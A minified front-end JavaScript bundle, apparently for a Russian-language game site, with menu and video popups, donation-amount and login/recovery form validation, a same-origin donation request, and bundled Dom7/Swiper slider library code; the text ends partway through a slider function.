/*!For license information please see app.js.LICENSE.txt*/ (() => {
  var e,
    t = {
      80: (e, t, s) => {
        s(940), s(889);
        var i = document.querySelector("#body");
        i.classList.remove("preload");
        var a = document.querySelector(".js-burger-toggler"),
          n = document.querySelector(".js-burger-navbar"),
          r = n.querySelectorAll(".burger-navbar__item"),
          o = document.querySelector(".js-content-overlapping"),
          l = !1,
          d = document.querySelector(".play__btn-promo"),
          c = document.querySelector(".instruction__btn"),
          p = document.querySelector(".js-video-container"),
          h = document.getElementById("video-youtube"),
          u = document.querySelector(".video__close-btn");
        function m(e, t) {
          Object.keys(t).forEach(function (s) {
            e.style[s] = t[s];
          });
        }
        function g(e) {
          o.classList.add("show"),
            m(a, { zIndex: "8" }),
            i.classList.add("not-scroll"),
            setTimeout(function () {
              p.classList.add("show");
            }, 300),
            h.setAttribute("src", e);
        }
        function f() {
          m(a, { zIndex: "12" }),
            i.classList.remove("not-scroll"),
            o.classList.remove("show"),
            p.classList.remove("show"),
            h.removeAttribute("src");
        }
        a.addEventListener("click", function () {
          (n.scrollTop = 0),
            n.classList.toggle("show"),
            i.classList.toggle("not-scroll"),
            a.classList.toggle("show"),
            (l = !l);
        }),
          r.forEach(function (e) {
            e.addEventListener("click", function () {
              (n.scrollTop = 0),
                n.classList.toggle("show"),
                i.classList.toggle("not-scroll"),
                a.classList.toggle("show"),
                (l = !l);
            });
          }),
          d &&
            c &&
            (d.addEventListener("click", function () {
              g(d.getAttribute("data-src"));
            }),
            c.addEventListener("click", function () {
              g(c.getAttribute("data-src"));
            })),
          o.addEventListener("click", function () {
            f();
          }),
          u.addEventListener("click", function () {
            f();
          });
        var v = document.querySelector(".popup-monitoring"),
          y = document.querySelector(".play__btn-monitoring"),
          b = document.querySelector(".content-close-btn");
        y &&
          b &&
          ((y.onclick = function () {
            v.classList.toggle("show"), i.classList.toggle("not-scroll");
          }),
          (b.onclick = function () {
            v.classList.toggle("show"), i.classList.toggle("not-scroll");
          }));
        var w = document.querySelector(".contacts__scroll-up");
        w &&
          w.addEventListener("click", function () {
            window.scrollTo({ top: 0, behavior: "smooth" });
          });
        var x = document.querySelector(".refill__input-money"),
          T = document.querySelector(".refill-num"),
          C = document.querySelector(".refill-num-donate"),
          E = window.location.pathname;
        null == x ||
          x.addEventListener("input", function (e) {
            console.log(E),
              "/donate-x2" === E
                ? e.target.value < 1
                  ? ((T.innerHTML = "1"), (C.innerHTML = "2"))
                  : ((T.innerHTML = e.target.value),
                    (C.innerHTML = 2 * e.target.value))
                : e.target.value < 1
                ? ((T.innerHTML = "1"), (C.innerHTML = "1"))
                : ((T.innerHTML = e.target.value),
                  (C.innerHTML = e.target.value));
          });
      },
      940: () => {
        function e(e, s) {
          var i =
            ("undefined" != typeof Symbol && e[Symbol.iterator]) ||
            e["@@iterator"];
          if (!i) {
            if (
              Array.isArray(e) ||
              (i = (function (e, s) {
                if (e) {
                  if ("string" == typeof e) return t(e, s);
                  var i = Object.prototype.toString.call(e).slice(8, -1);
                  return (
                    "Object" === i && e.constructor && (i = e.constructor.name),
                    "Map" === i || "Set" === i
                      ? Array.from(e)
                      : "Arguments" === i ||
                        /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(i)
                      ? t(e, s)
                      : void 0
                  );
                }
              })(e)) ||
              (s && e && "number" == typeof e.length)
            ) {
              i && (e = i);
              var a = 0,
                n = function () {};
              return {
                s: n,
                n: function () {
                  return a >= e.length
                    ? { done: !0 }
                    : { done: !1, value: e[a++] };
                },
                e: function (e) {
                  throw e;
                },
                f: n,
              };
            }
            throw new TypeError(
              "Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."
            );
          }
          var r,
            o = !0,
            l = !1;
          return {
            s: function () {
              i = i.call(e);
            },
            n: function () {
              var e = i.next();
              return (o = e.done), e;
            },
            e: function (e) {
              (l = !0), (r = e);
            },
            f: function () {
              try {
                o || null == i.return || i.return();
              } finally {
                if (l) throw r;
              }
            },
          };
        }
        function t(e, t) {
          (null == t || t > e.length) && (t = e.length);
          for (var s = 0, i = new Array(t); s < t; s++) i[s] = e[s];
          return i;
        }
        !(function () {
          var t = document.querySelector("#body"),
            s = document.querySelector(".popup-error"),
            i = document.querySelector(".popup-error__btn"),
            a = document.querySelector(".popup-success__btn"),
            n = document.querySelector(".popup-error__text"),
            r = document.querySelector(".popup-success"),
            o = /[A-Za-zА-Яа-я]{1,15}$/,
            l = /^([a-zA-Z0-9_\-]+)@([a-zA-Z0-9_\-]+)\.([a-zA-Z]{2,5})$/,
            d = /(?=.*?[0-9A-Za-zА-Яа-я]).{3,}$/;
          function c(t) {
            var s = !0,
              i = !0,
              a = !1,
              n = "";
            document.querySelectorAll(".error-msg").forEach(function (e) {
              e.remove();
            }),
              t.querySelectorAll("input").forEach(function (e) {
                e.style.borderColor = "#FFC700";
              });
            var c,
              u = e(t.querySelectorAll("input"));
            try {
              for (u.s(); !(c = u.n()).done; ) {
                var m = c.value;
                switch (m.dataset.control) {
                  case "name":
                    o.test(m.value) ||
                      (h(m, "Введите логин!"), (s = !1), console.log("name"));
                    break;
                  case "password":
                    d.test(m.value) || (h(m, "Введите пароль!"), (s = !1));
                    break;
                  case "old_password":
                    d.test(m.value) ||
                      (h(m, "Введите текущий пароль!"), (s = !1));
                    break;
                  case "new_password":
                    d.test(m.value) ||
                      (h(m, "Введите новый пароль!"), (s = !1));
                    break;
                  case "email":
                    l.test(m.value) || (h(m, "Введите ваш емейл!"), (s = !1));
                    break;
                  case "money":
                    !m.value > 0 && (h(m, "Введите сумму денег!"), (s = !1));
                    break;
                  case "recovery_confirm":
                    d.test(m.value) ||
                      (h(m, "Введите код восстановления пароля!"),
                      (a = !1),
                      (s = !1));
                    break;
                  case "recovery":
                    if (!m.value)
                      return (
                        p("Выберите куда отправлять код!"),
                        (s = !1),
                        void (a = !1)
                      );
                    n = m.value;
                    break;
                  default:
                    console.log("Error switch!");
                }
              }
            } catch (e) {
              u.e(e);
            } finally {
              u.f();
            }
            var g,
              f = e(t.querySelectorAll("select"));
            try {
              for (f.s(); !(g = f.n()).done; ) {
                var v = g.value;
                switch (v.value) {
                  case "0":
                    return p("Укажите сервер!"), void (i = !1);
                  case "1":
                    return p("Укажите почту!"), void (i = !1);
                  default:
                    console.log("Error switch!");
                }
                v.classList.contains("mail-select") && (n = v.value);
              }
            } catch (e) {
              f.e(e);
            } finally {
              f.f();
            }
            return (s && i) || a
              ? ("" !== n &&
                  (function (e) {
                    (document.querySelector(".success__text").innerHTML = e),
                      r.classList.add("show");
                  })(n),
                console.log("popup success - " + !0),
                !0)
              : (console.log("popup error - false"), !1);
          }
          function p(e) {
            (n.innerHTML = e),
              t.classList.add("not-scroll"),
              s.classList.add("show");
          }
          function h(e, t) {
            e.style.borderColor = "red";
            var s = document.createElement("p");
            (s.innerHTML = t),
              s.classList.add("error-msg"),
              e.closest(".form__input-wrap").append(s);
          }
          var u = document.querySelector(".refill__form");
          null == u ||
            u.addEventListener("submit", function (e) {
              e.preventDefault();
              var t = new FormData(e.target);
              c(e.target) &&
                fetch("/donate", { method: "post", body: t })
                  .then(function (e) {
                    return e.json();
                  })
                  .then(function (e) {
                    "error" === e.statusMessage
                      ? p(e.message)
                      : (location.href = e.url),
                      console.log("form submit");
                  })
                  .catch(function (e) {
                    return console.log(e);
                  });
            }),
            (a.onclick = function () {
              (document.location.href = "/recovery-confirm"),
                r.classList.remove("show"),
                t.classList.remove("not-scroll");
            }),
            i.addEventListener("click", function () {
              s.classList.remove("show"), t.classList.remove("not-scroll");
            });
        })();
      },
      889: (e, t, s) => {
        "use strict";
        function i(e) {
          return (
            null !== e &&
            "object" == typeof e &&
            "constructor" in e &&
            e.constructor === Object
          );
        }
        function a(e, t) {
          void 0 === e && (e = {}),
            void 0 === t && (t = {}),
            Object.keys(t).forEach(function (s) {
              void 0 === e[s]
                ? (e[s] = t[s])
                : i(t[s]) &&
                  i(e[s]) &&
                  Object.keys(t[s]).length > 0 &&
                  a(e[s], t[s]);
            });
        }
        s.r(t);
        var n = "undefined" != typeof document ? document : {},
          r = {
            body: {},
            addEventListener: function () {},
            removeEventListener: function () {},
            activeElement: { blur: function () {}, nodeName: "" },
            querySelector: function () {
              return null;
            },
            querySelectorAll: function () {
              return [];
            },
            getElementById: function () {
              return null;
            },
            createEvent: function () {
              return { initEvent: function () {} };
            },
            createElement: function () {
              return {
                children: [],
                childNodes: [],
                style: {},
                setAttribute: function () {},
                getElementsByTagName: function () {
                  return [];
                },
              };
            },
            createElementNS: function () {
              return {};
            },
            importNode: function () {
              return null;
            },
            location: {
              hash: "",
              host: "",
              hostname: "",
              href: "",
              origin: "",
              pathname: "",
              protocol: "",
              search: "",
            },
          };
        a(n, r);
        var o = "undefined" != typeof window ? window : {};
        a(o, {
          document: r,
          navigator: { userAgent: "" },
          location: {
            hash: "",
            host: "",
            hostname: "",
            href: "",
            origin: "",
            pathname: "",
            protocol: "",
            search: "",
          },
          history: {
            replaceState: function () {},
            pushState: function () {},
            go: function () {},
            back: function () {},
          },
          CustomEvent: function () {
            return this;
          },
          addEventListener: function () {},
          removeEventListener: function () {},
          getComputedStyle: function () {
            return {
              getPropertyValue: function () {
                return "";
              },
            };
          },
          Image: function () {},
          Date: function () {},
          screen: {},
          setTimeout: function () {},
          clearTimeout: function () {},
          matchMedia: function () {
            return {};
          },
        });
        class l {
          constructor(e) {
            const t = this;
            for (let s = 0; s < e.length; s += 1) t[s] = e[s];
            return (t.length = e.length), this;
          }
        }
        function d(e, t) {
          const s = [];
          let i = 0;
          if (e && !t && e instanceof l) return e;
          if (e)
            if ("string" == typeof e) {
              let a, r;
              const o = e.trim();
              if (o.indexOf("<") >= 0 && o.indexOf(">") >= 0) {
                let e = "div";
                for (
                  0 === o.indexOf("<li") && (e = "ul"),
                    0 === o.indexOf("<tr") && (e = "tbody"),
                    (0 !== o.indexOf("<td") && 0 !== o.indexOf("<th")) ||
                      (e = "tr"),
                    0 === o.indexOf("<tbody") && (e = "table"),
                    0 === o.indexOf("<option") && (e = "select"),
                    r = n.createElement(e),
                    r.innerHTML = o,
                    i = 0;
                  i < r.childNodes.length;
                  i += 1
                )
                  s.push(r.childNodes[i]);
              } else
                for (
                  a =
                    t || "#" !== e[0] || e.match(/[ .<>:~]/)
                      ? (t || n).querySelectorAll(e.trim())
                      : [n.getElementById(e.trim().split("#")[1])],
                    i = 0;
                  i < a.length;
                  i += 1
                )
                  a[i] && s.push(a[i]);
            } else if (e.nodeType || e === o || e === n) s.push(e);
            else if (e.length > 0 && e[0].nodeType)
              for (i = 0; i < e.length; i += 1) s.push(e[i]);
          return new l(s);
        }
        function c(e) {
          const t = [];
          for (let s = 0; s < e.length; s += 1)
            -1 === t.indexOf(e[s]) && t.push(e[s]);
          return t;
        }
        (d.fn = l.prototype),
          (d.Class = l),
          (d.Dom7 = l),
          "resize scroll".split(" ");
        const p = {
          addClass: function (e) {
            if (void 0 === e) return this;
            const t = e.split(" ");
            for (let e = 0; e < t.length; e += 1)
              for (let s = 0; s < this.length; s += 1)
                void 0 !== this[s] &&
                  void 0 !== this[s].classList &&
                  this[s].classList.add(t[e]);
            return this;
          },
          removeClass: function (e) {
            const t = e.split(" ");
            for (let e = 0; e < t.length; e += 1)
              for (let s = 0; s < this.length; s += 1)
                void 0 !== this[s] &&
                  void 0 !== this[s].classList &&
                  this[s].classList.remove(t[e]);
            return this;
          },
          hasClass: function (e) {
            return !!this[0] && this[0].classList.contains(e);
          },
          toggleClass: function (e) {
            const t = e.split(" ");
            for (let e = 0; e < t.length; e += 1)
              for (let s = 0; s < this.length; s += 1)
                void 0 !== this[s] &&
                  void 0 !== this[s].classList &&
                  this[s].classList.toggle(t[e]);
            return this;
          },
          attr: function (e, t) {
            if (1 === arguments.length && "string" == typeof e)
              return this[0] ? this[0].getAttribute(e) : void 0;
            for (let s = 0; s < this.length; s += 1)
              if (2 === arguments.length) this[s].setAttribute(e, t);
              else
                for (const t in e)
                  (this[s][t] = e[t]), this[s].setAttribute(t, e[t]);
            return this;
          },
          removeAttr: function (e) {
            for (let t = 0; t < this.length; t += 1) this[t].removeAttribute(e);
            return this;
          },
          data: function (e, t) {
            let s;
            if (void 0 !== t) {
              for (let i = 0; i < this.length; i += 1)
                (s = this[i]),
                  s.dom7ElementDataStorage || (s.dom7ElementDataStorage = {}),
                  (s.dom7ElementDataStorage[e] = t);
              return this;
            }
            if (((s = this[0]), s)) {
              if (s.dom7ElementDataStorage && e in s.dom7ElementDataStorage)
                return s.dom7ElementDataStorage[e];
              return s.getAttribute(`data-${e}`) || void 0;
            }
          },
          transform: function (e) {
            for (let t = 0; t < this.length; t += 1) {
              const s = this[t].style;
              (s.webkitTransform = e), (s.transform = e);
            }
            return this;
          },
          transition: function (e) {
            "string" != typeof e && (e = `${e}ms`);
            for (let t = 0; t < this.length; t += 1) {
              const s = this[t].style;
              (s.webkitTransitionDuration = e), (s.transitionDuration = e);
            }
            return this;
          },
          on: function (...e) {
            let [t, s, i, a] = e;
            function n(e) {
              const t = e.target;
              if (!t) return;
              const a = e.target.dom7EventData || [];
              if ((a.indexOf(e) < 0 && a.unshift(e), d(t).is(s))) i.apply(t, a);
              else {
                const e = d(t).parents();
                for (let t = 0; t < e.length; t += 1)
                  d(e[t]).is(s) && i.apply(e[t], a);
              }
            }
            function r(e) {
              const t = (e && e.target && e.target.dom7EventData) || [];
              t.indexOf(e) < 0 && t.unshift(e), i.apply(this, t);
            }
            "function" == typeof e[1] && (([t, i, a] = e), (s = void 0)),
              a || (a = !1);
            const o = t.split(" ");
            let l;
            for (let e = 0; e < this.length; e += 1) {
              const t = this[e];
              if (s)
                for (l = 0; l < o.length; l += 1) {
                  const e = o[l];
                  t.dom7LiveListeners || (t.dom7LiveListeners = {}),
                    t.dom7LiveListeners[e] || (t.dom7LiveListeners[e] = []),
                    t.dom7LiveListeners[e].push({
                      listener: i,
                      proxyListener: n,
                    }),
                    t.addEventListener(e, n, a);
                }
              else
                for (l = 0; l < o.length; l += 1) {
                  const e = o[l];
                  t.dom7Listeners || (t.dom7Listeners = {}),
                    t.dom7Listeners[e] || (t.dom7Listeners[e] = []),
                    t.dom7Listeners[e].push({ listener: i, proxyListener: r }),
                    t.addEventListener(e, r, a);
                }
            }
            return this;
          },
          off: function (...e) {
            let [t, s, i, a] = e;
            "function" == typeof e[1] && (([t, i, a] = e), (s = void 0)),
              a || (a = !1);
            const n = t.split(" ");
            for (let e = 0; e < n.length; e += 1) {
              const t = n[e];
              for (let e = 0; e < this.length; e += 1) {
                const n = this[e];
                let r;
                if (
                  (!s && n.dom7Listeners
                    ? (r = n.dom7Listeners[t])
                    : s && n.dom7LiveListeners && (r = n.dom7LiveListeners[t]),
                  r && r.length)
                )
                  for (let e = r.length - 1; e >= 0; e -= 1) {
                    const s = r[e];
                    (i && s.listener === i) ||
                    (i &&
                      s.listener &&
                      s.listener.dom7proxy &&
                      s.listener.dom7proxy === i)
                      ? (n.removeEventListener(t, s.proxyListener, a),
                        r.splice(e, 1))
                      : i ||
                        (n.removeEventListener(t, s.proxyListener, a),
                        r.splice(e, 1));
                  }
              }
            }
            return this;
          },
          trigger: function (...e) {
            const t = e[0].split(" "),
              s = e[1];
            for (let i = 0; i < t.length; i += 1) {
              const a = t[i];
              for (let t = 0; t < this.length; t += 1) {
                const i = this[t];
                let r;
                try {
                  r = new o.CustomEvent(a, {
                    detail: s,
                    bubbles: !0,
                    cancelable: !0,
                  });
                } catch (e) {
                  (r = n.createEvent("Event")),
                    r.initEvent(a, !0, !0),
                    (r.detail = s);
                }
                (i.dom7EventData = e.filter((e, t) => t > 0)),
                  i.dispatchEvent(r),
                  (i.dom7EventData = []),
                  delete i.dom7EventData;
              }
            }
            return this;
          },
          transitionEnd: function (e) {
            const t = ["webkitTransitionEnd", "transitionend"],
              s = this;
            let i;
            function a(n) {
              if (n.target === this)
                for (e.call(this, n), i = 0; i < t.length; i += 1)
                  s.off(t[i], a);
            }
            if (e) for (i = 0; i < t.length; i += 1) s.on(t[i], a);
            return this;
          },
          outerWidth: function (e) {
            if (this.length > 0) {
              if (e) {
                const e = this.styles();
                return (
                  this[0].offsetWidth +
                  parseFloat(e.getPropertyValue("margin-right")) +
                  parseFloat(e.getPropertyValue("margin-left"))
                );
              }
              return this[0].offsetWidth;
            }
            return null;
          },
          outerHeight: function (e) {
            if (this.length > 0) {
              if (e) {
                const e = this.styles();
                return (
                  this[0].offsetHeight +
                  parseFloat(e.getPropertyValue("margin-top")) +
                  parseFloat(e.getPropertyValue("margin-bottom"))
                );
              }
              return this[0].offsetHeight;
            }
            return null;
          },
          offset: function () {
            if (this.length > 0) {
              const e = this[0],
                t = e.getBoundingClientRect(),
                s = n.body,
                i = e.clientTop || s.clientTop || 0,
                a = e.clientLeft || s.clientLeft || 0,
                r = e === o ? o.scrollY : e.scrollTop,
                l = e === o ? o.scrollX : e.scrollLeft;
              return { top: t.top + r - i, left: t.left + l - a };
            }
            return null;
          },
          css: function (e, t) {
            let s;
            if (1 === arguments.length) {
              if ("string" != typeof e) {
                for (s = 0; s < this.length; s += 1)
                  for (let t in e) this[s].style[t] = e[t];
                return this;
              }
              if (this[0])
                return o.getComputedStyle(this[0], null).getPropertyValue(e);
            }
            if (2 === arguments.length && "string" == typeof e) {
              for (s = 0; s < this.length; s += 1) this[s].style[e] = t;
              return this;
            }
            return this;
          },
          each: function (e) {
            if (!e) return this;
            for (let t = 0; t < this.length; t += 1)
              if (!1 === e.call(this[t], t, this[t])) return this;
            return this;
          },
          html: function (e) {
            if (void 0 === e) return this[0] ? this[0].innerHTML : void 0;
            for (let t = 0; t < this.length; t += 1) this[t].innerHTML = e;
            return this;
          },
          text: function (e) {
            if (void 0 === e)
              return this[0] ? this[0].textContent.trim() : null;
            for (let t = 0; t < this.length; t += 1) this[t].textContent = e;
            return this;
          },
          is: function (e) {
            const t = this[0];
            let s, i;
            if (!t || void 0 === e) return !1;
            if ("string" == typeof e) {
              if (t.matches) return t.matches(e);
              if (t.webkitMatchesSelector) return t.webkitMatchesSelector(e);
              if (t.msMatchesSelector) return t.msMatchesSelector(e);
              for (s = d(e), i = 0; i < s.length; i += 1)
                if (s[i] === t) return !0;
              return !1;
            }
            if (e === n) return t === n;
            if (e === o) return t === o;
            if (e.nodeType || e instanceof l) {
              for (s = e.nodeType ? [e] : e, i = 0; i < s.length; i += 1)
                if (s[i] === t) return !0;
              return !1;
            }
            return !1;
          },
          index: function () {
            let e,
              t = this[0];
            if (t) {
              for (e = 0; null !== (t = t.previousSibling); )
                1 === t.nodeType && (e += 1);
              return e;
            }
          },
          eq: function (e) {
            if (void 0 === e) return this;
            const t = this.length;
            let s;
            return e > t - 1
              ? new l([])
              : e < 0
              ? ((s = t + e), new l(s < 0 ? [] : [this[s]]))
              : new l([this[e]]);
          },
          append: function (...e) {
            let t;
            for (let s = 0; s < e.length; s += 1) {
              t = e[s];
              for (let e = 0; e < this.length; e += 1)
                if ("string" == typeof t) {
                  const s = n.createElement("div");
                  for (s.innerHTML = t; s.firstChild; )
                    this[e].appendChild(s.firstChild);
                } else if (t instanceof l)
                  for (let s = 0; s < t.length; s += 1)
                    this[e].appendChild(t[s]);
                else this[e].appendChild(t);
            }
            return this;
          },
          prepend: function (e) {
            let t, s;
            for (t = 0; t < this.length; t += 1)
              if ("string" == typeof e) {
                const i = n.createElement("div");
                for (
                  i.innerHTML = e, s = i.childNodes.length - 1;
                  s >= 0;
                  s -= 1
                )
                  this[t].insertBefore(i.childNodes[s], this[t].childNodes[0]);
              } else if (e instanceof l)
                for (s = 0; s < e.length; s += 1)
                  this[t].insertBefore(e[s], this[t].childNodes[0]);
              else this[t].insertBefore(e, this[t].childNodes[0]);
            return this;
          },
          next: function (e) {
            return this.length > 0
              ? e
                ? this[0].nextElementSibling &&
                  d(this[0].nextElementSibling).is(e)
                  ? new l([this[0].nextElementSibling])
                  : new l([])
                : this[0].nextElementSibling
                ? new l([this[0].nextElementSibling])
                : new l([])
              : new l([]);
          },
          nextAll: function (e) {
            const t = [];
            let s = this[0];
            if (!s) return new l([]);
            for (; s.nextElementSibling; ) {
              const i = s.nextElementSibling;
              e ? d(i).is(e) && t.push(i) : t.push(i), (s = i);
            }
            return new l(t);
          },
          prev: function (e) {
            if (this.length > 0) {
              const t = this[0];
              return e
                ? t.previousElementSibling && d(t.previousElementSibling).is(e)
                  ? new l([t.previousElementSibling])
                  : new l([])
                : t.previousElementSibling
                ? new l([t.previousElementSibling])
                : new l([]);
            }
            return new l([]);
          },
          prevAll: function (e) {
            const t = [];
            let s = this[0];
            if (!s) return new l([]);
            for (; s.previousElementSibling; ) {
              const i = s.previousElementSibling;
              e ? d(i).is(e) && t.push(i) : t.push(i), (s = i);
            }
            return new l(t);
          },
          parent: function (e) {
            const t = [];
            for (let s = 0; s < this.length; s += 1)
              null !== this[s].parentNode &&
                (e
                  ? d(this[s].parentNode).is(e) && t.push(this[s].parentNode)
                  : t.push(this[s].parentNode));
            return d(c(t));
          },
          parents: function (e) {
            const t = [];
            for (let s = 0; s < this.length; s += 1) {
              let i = this[s].parentNode;
              for (; i; )
                e ? d(i).is(e) && t.push(i) : t.push(i), (i = i.parentNode);
            }
            return d(c(t));
          },
          closest: function (e) {
            let t = this;
            return void 0 === e
              ? new l([])
              : (t.is(e) || (t = t.parents(e).eq(0)), t);
          },
          find: function (e) {
            const t = [];
            for (let s = 0; s < this.length; s += 1) {
              const i = this[s].querySelectorAll(e);
              for (let e = 0; e < i.length; e += 1) t.push(i[e]);
            }
            return new l(t);
          },
          children: function (e) {
            const t = [];
            for (let s = 0; s < this.length; s += 1) {
              const i = this[s].childNodes;
              for (let s = 0; s < i.length; s += 1)
                e
                  ? 1 === i[s].nodeType && d(i[s]).is(e) && t.push(i[s])
                  : 1 === i[s].nodeType && t.push(i[s]);
            }
            return new l(c(t));
          },
          filter: function (e) {
            const t = [],
              s = this;
            for (let i = 0; i < s.length; i += 1)
              e.call(s[i], i, s[i]) && t.push(s[i]);
            return new l(t);
          },
          remove: function () {
            for (let e = 0; e < this.length; e += 1)
              this[e].parentNode && this[e].parentNode.removeChild(this[e]);
            return this;
          },
          add: function (...e) {
            const t = this;
            let s, i;
            for (s = 0; s < e.length; s += 1) {
              const a = d(e[s]);
              for (i = 0; i < a.length; i += 1)
                (t[t.length] = a[i]), (t.length += 1);
            }
            return t;
          },
          styles: function () {
            return this[0] ? o.getComputedStyle(this[0], null) : {};
          },
        };
        Object.keys(p).forEach((e) => {
          d.fn[e] = d.fn[e] || p[e];
        });
        const h = {
            deleteProps(e) {
              const t = e;
              Object.keys(t).forEach((e) => {
                try {
                  t[e] = null;
                } catch (e) {}
                try {
                  delete t[e];
                } catch (e) {}
              });
            },
            nextTick: (e, t = 0) => setTimeout(e, t),
            now: () => Date.now(),
            getTranslate(e, t = "x") {
              let s, i, a;
              const n = o.getComputedStyle(e, null);
              return (
                o.WebKitCSSMatrix
                  ? ((i = n.transform || n.webkitTransform),
                    i.split(",").length > 6 &&
                      (i = i
                        .split(", ")
                        .map((e) => e.replace(",", "."))
                        .join(", ")),
                    (a = new o.WebKitCSSMatrix("none" === i ? "" : i)))
                  : ((a =
                      n.MozTransform ||
                      n.OTransform ||
                      n.MsTransform ||
                      n.msTransform ||
                      n.transform ||
                      n
                        .getPropertyValue("transform")
                        .replace("translate(", "matrix(1, 0, 0, 1,")),
                    (s = a.toString().split(","))),
                "x" === t &&
                  (i = o.WebKitCSSMatrix
                    ? a.m41
                    : 16 === s.length
                    ? parseFloat(s[12])
                    : parseFloat(s[4])),
                "y" === t &&
                  (i = o.WebKitCSSMatrix
                    ? a.m42
                    : 16 === s.length
                    ? parseFloat(s[13])
                    : parseFloat(s[5])),
                i || 0
              );
            },
            parseUrlQuery(e) {
              const t = {};
              let s,
                i,
                a,
                n,
                r = e || o.location.href;
              if ("string" == typeof r && r.length)
                for (
                  r = r.indexOf("?") > -1 ? r.replace(/\S*\?/, "") : "",
                    i = r.split("&").filter((e) => "" !== e),
                    n = i.length,
                    s = 0;
                  s < n;
                  s += 1
                )
                  (a = i[s].replace(/#\S+/g, "").split("=")),
                    (t[decodeURIComponent(a[0])] =
                      void 0 === a[1]
                        ? void 0
                        : decodeURIComponent(a[1]) || "");
              return t;
            },
            isObject: (e) =>
              "object" == typeof e &&
              null !== e &&
              e.constructor &&
              e.constructor === Object,
            extend(...e) {
              const t = Object(e[0]);
              for (let s = 1; s < e.length; s += 1) {
                const i = e[s];
                if (null != i) {
                  const e = Object.keys(Object(i));
                  for (let s = 0, a = e.length; s < a; s += 1) {
                    const a = e[s],
                      n = Object.getOwnPropertyDescriptor(i, a);
                    void 0 !== n &&
                      n.enumerable &&
                      (h.isObject(t[a]) && h.isObject(i[a])
                        ? h.extend(t[a], i[a])
                        : !h.isObject(t[a]) && h.isObject(i[a])
                        ? ((t[a] = {}), h.extend(t[a], i[a]))
                        : (t[a] = i[a]));
                  }
                }
              }
              return t;
            },
          },
          u = {
            touch: !!(
              "ontouchstart" in o ||
              (o.DocumentTouch && n instanceof o.DocumentTouch)
            ),
            pointerEvents:
              !!o.PointerEvent &&
              "maxTouchPoints" in o.navigator &&
              o.navigator.maxTouchPoints >= 0,
            observer: "MutationObserver" in o || "WebkitMutationObserver" in o,
            passiveListener: (function () {
              let e = !1;
              try {
                const t = Object.defineProperty({}, "passive", {
                  get() {
                    e = !0;
                  },
                });
                o.addEventListener("testPassiveListener", null, t);
              } catch (e) {}
              return e;
            })(),
            gestures: "ongesturestart" in o,
          };
        class m {
          constructor(e = {}) {
            const t = this;
            (t.params = e),
              (t.eventsListeners = {}),
              t.params &&
                t.params.on &&
                Object.keys(t.params.on).forEach((e) => {
                  t.on(e, t.params.on[e]);
                });
          }
          on(e, t, s) {
            const i = this;
            if ("function" != typeof t) return i;
            const a = s ? "unshift" : "push";
            return (
              e.split(" ").forEach((e) => {
                i.eventsListeners[e] || (i.eventsListeners[e] = []),
                  i.eventsListeners[e][a](t);
              }),
              i
            );
          }
          once(e, t, s) {
            const i = this;
            if ("function" != typeof t) return i;
            function a(...s) {
              i.off(e, a), a.f7proxy && delete a.f7proxy, t.apply(i, s);
            }
            return (a.f7proxy = t), i.on(e, a, s);
          }
          off(e, t) {
            const s = this;
            return s.eventsListeners
              ? (e.split(" ").forEach((e) => {
                  void 0 === t
                    ? (s.eventsListeners[e] = [])
                    : s.eventsListeners[e] &&
                      s.eventsListeners[e].length &&
                      s.eventsListeners[e].forEach((i, a) => {
                        (i === t || (i.f7proxy && i.f7proxy === t)) &&
                          s.eventsListeners[e].splice(a, 1);
                      });
                }),
                s)
              : s;
          }
          emit(...e) {
            const t = this;
            if (!t.eventsListeners) return t;
            let s, i, a;
            return (
              "string" == typeof e[0] || Array.isArray(e[0])
                ? ((s = e[0]), (i = e.slice(1, e.length)), (a = t))
                : ((s = e[0].events), (i = e[0].data), (a = e[0].context || t)),
              (Array.isArray(s) ? s : s.split(" ")).forEach((e) => {
                if (t.eventsListeners && t.eventsListeners[e]) {
                  const s = [];
                  t.eventsListeners[e].forEach((e) => {
                    s.push(e);
                  }),
                    s.forEach((e) => {
                      e.apply(a, i);
                    });
                }
              }),
              t
            );
          }
          useModulesParams(e) {
            const t = this;
            t.modules &&
              Object.keys(t.modules).forEach((s) => {
                const i = t.modules[s];
                i.params && h.extend(e, i.params);
              });
          }
          useModules(e = {}) {
            const t = this;
            t.modules &&
              Object.keys(t.modules).forEach((s) => {
                const i = t.modules[s],
                  a = e[s] || {};
                i.instance &&
                  Object.keys(i.instance).forEach((e) => {
                    const s = i.instance[e];
                    t[e] = "function" == typeof s ? s.bind(t) : s;
                  }),
                  i.on &&
                    t.on &&
                    Object.keys(i.on).forEach((e) => {
                      t.on(e, i.on[e]);
                    }),
                  i.create && i.create.bind(t)(a);
              });
          }
          static set components(e) {
            this.use && this.use(e);
          }
          static installModule(e, ...t) {
            const s = this;
            s.prototype.modules || (s.prototype.modules = {});
            const i =
              e.name || `${Object.keys(s.prototype.modules).length}_${h.now()}`;
            return (
              (s.prototype.modules[i] = e),
              e.proto &&
                Object.keys(e.proto).forEach((t) => {
                  s.prototype[t] = e.proto[t];
                }),
              e.static &&
                Object.keys(e.static).forEach((t) => {
                  s[t] = e.static[t];
                }),
              e.install && e.install.apply(s, t),
              s
            );
          }
          static use(e, ...t) {
            const s = this;
            return Array.isArray(e)
              ? (e.forEach((e) => s.installModule(e)), s)
              : s.installModule(e, ...t);
          }
        }
        var g = {
            updateSize: function () {
              const e = this;
              let t, s;
              const i = e.$el;
              (t =
                void 0 !== e.params.width ? e.params.width : i[0].clientWidth),
                (s =
                  void 0 !== e.params.height
                    ? e.params.height
                    : i[0].clientHeight),
                (0 === t && e.isHorizontal()) ||
                  (0 === s && e.isVertical()) ||
                  ((t =
                    t -
                    parseInt(i.css("padding-left"), 10) -
                    parseInt(i.css("padding-right"), 10)),
                  (s =
                    s -
                    parseInt(i.css("padding-top"), 10) -
                    parseInt(i.css("padding-bottom"), 10)),
                  h.extend(e, {
                    width: t,
                    height: s,
                    size: e.isHorizontal() ? t : s,
                  }));
            },
            updateSlides: function () {
              const e = this,
                t = e.params,
                { $wrapperEl: s, size: i, rtlTranslate: a, wrongRTL: n } = e,
                r = e.virtual && t.virtual.enabled,
                l = r ? e.virtual.slides.length : e.slides.length,
                d = s.children(`.${e.params.slideClass}`),
                c = r ? e.virtual.slides.length : d.length;
              let p = [];
              const u = [],
                m = [];
              function g(e) {
                return !t.cssMode || e !== d.length - 1;
              }
              let f = t.slidesOffsetBefore;
              "function" == typeof f && (f = t.slidesOffsetBefore.call(e));
              let v = t.slidesOffsetAfter;
